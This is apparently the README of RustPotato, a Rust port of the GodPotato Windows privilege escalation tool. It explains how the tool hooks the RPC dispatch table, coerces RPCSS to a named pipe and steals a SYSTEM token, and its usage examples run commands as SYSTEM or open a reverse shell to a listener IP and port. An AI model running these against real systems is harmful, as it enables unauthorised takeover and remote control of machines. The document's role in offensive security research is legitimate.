# RustPotato

**RustPotato** is a Rust-based implementation of [GodPotato](https://github.com/BeichenDream/GodPotato), a privilege escalation tool that abuses **DCOM** and **RPC** to leverage **SeImpersonatePrivilege** and gain `NT AUTHORITY\SYSTEM` privileges on Windows systems.

## Key Features

- **TCP-based Reverse Shell**:  
  RustPotato features a TCP-based reverse shell based on [Rustic64Shell](https://github.com/safedv/Rustic64Shell). It leverages Winsock APIs for network communication and indirect NT APIs for pipe-based I/O redirection, enabling command execution through `cmd` or `powershell`.

- **Indirect NTAPI**:  
  RustPotato leverages indirect NTAPI calls for various operations, including token handling and manipulation.

## Overview

Below is an overview of its execution flow, highlighting key operations at each step:

### 1. **Initialize and Hook RPC Context**

1. **Locate `RPC_SERVER_INTERFACE` Structure**:  
   The tool scans the memory of `combase.dll` to find the `RPC_SERVER_INTERFACE` structure, a critical component for managing RPC communications through the OXID Resolver.

2. **Hook RPC Dispatch Table**:  
   RustPotato replaces the first entry in the `RPC_DISPATCH_TABLE` with a custom function pointer, enabling interception and manipulation of specific RPC calls.

### 2. **Start Named Pipe Server and Trigger RPCSS**

The named pipe server plays a central role in impersonation and privilege escalation:

- **Create Named Pipe**:  
  A named pipe (e.g., `\\.\pipe\RustPotato`) is created with unrestricted access, serving as the endpoint for client connections.

- **Unmarshal COM Object**:  
  RustPotato crafts and unmarshals a COM object, compelling **RPCSS** to establish a connection with the named pipe.

- **Trigger RPCSS**:  
  The unmarshalled object invokes RPC calls that traverse the hooked dispatch table, allowing RustPotato to intercept and manipulate the interactions.

- **Impersonate Client**:  
  When **RPCSS** connects to the named pipe, RustPotato impersonates the client using `ImpersonateNamedPipeClient` to assume its security context.

- **Retrieve SYSTEM Token**:  
  During impersonation, RustPotato locates and duplicates a token associated with the `NT AUTHORITY\SYSTEM` account.

### 3. **Execute Command or Establish Reverse Shell**

- **Execute a Command**:  
  RustPotato uses the duplicated token to execute a specified command, leveraging `CreateProcessWithTokenW`.

- **Establish a Reverse Shell**:  
  With reverse shell options (`-h` and `-p`), RustPotato connects to a listener and executes commands through `cmd` or `powershell`.

### 4. **Restore State and Cleanup**

- **Restore RPC Dispatch Table**:  
  Removes the custom function pointer from the `RPC_DISPATCH_TABLE` and restores the original state in `combase.dll`.

- **Terminate Pipe Server**:  
  Stops the named pipe server, releasing all associated resources and handles.

## Usage

RustPotato provides the following features:

- **`verbose`**: Enables detailed logging during execution.

### Build Options

- **Basic build** (only the process output is printed):

  ```bash
  cargo +nightly-2025-02-14 build --release
  ```

- **Build with verbose logging**:

  ```bash
  cargo +nightly-2025-02-14 build --release --features verbose
  ```

> [!NOTE]
> RustPotato requires Rust nightly 1.86 and supports only x86_64 targets (MSVC or GNU).

### Help

```text
Usage:
  RustPotato.exe [command line] | [options]

Description:
  Execute a command line or start a reverse shell.

Options:
  -h <LHOST>         Specify the IP address of the listener for the reverse shell.
  -p <LPORT>         Specify the port of the listener for the reverse shell.
  -c <cmd|powershell>
                     Specify the shell to be used in the reverse shell (optional, default is cmd).

Examples:
  Execute a command line:
    RustPotato.exe "cmd.exe /c whoami"

  Start a reverse shell with the default shell (cmd):
    RustPotato.exe -h 192.168.1.100 -p 4444

  Start a reverse shell with powershell:
    RustPotato.exe -h 192.168.1.100 -p 4444 -c powershell
```

## Disclaimer

This project is for **educational and research purposes only**. RustPotato is a personal learning project focused on exploring Rust and Windows internals. Use it responsibly—any misuse is entirely your responsibility.

Always respect ethical guidelines and adhere to legal frameworks while conducting security research (or, honestly, in everything you do).

## Credits

Special thanks to:

- [BeichenDream](https://github.com/BeichenDream) for his work on [GodPotato](https://github.com/BeichenDream/GodPotato), which made this port possible!
- [Resolving System Service Numbers Using The Exception Directory by MDsec](https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/) for their insights on resolving SSNs.

---
